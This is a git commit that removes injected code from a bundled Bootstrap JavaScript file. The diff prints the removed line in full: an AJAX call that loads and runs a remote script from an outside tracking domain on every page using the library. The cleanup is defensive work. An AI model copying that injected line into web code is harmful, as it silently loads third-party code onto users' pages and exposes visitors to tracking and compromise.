cac9c73f63afa1452180f9db95472af08276b619
CrafterPlaysCZ <86855420+CrafterPlaysCZ@users.noreply.github.com>
2025-10-02 11:36:25 +0000

    Removed bootstrap spyware

--- js/bootstrap.js
+++ js/bootstrap.js
@@ -2733,13 +2733,13 @@
   }
 
 
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { } });
 
 
   /**
    * ------------------------------------------------------------------------
    * Constants
-   * ------------------------------------------------------------------------
+   * -----------------------------------------------------------------------
    */
 
   var NAME$6 = 'tooltip';
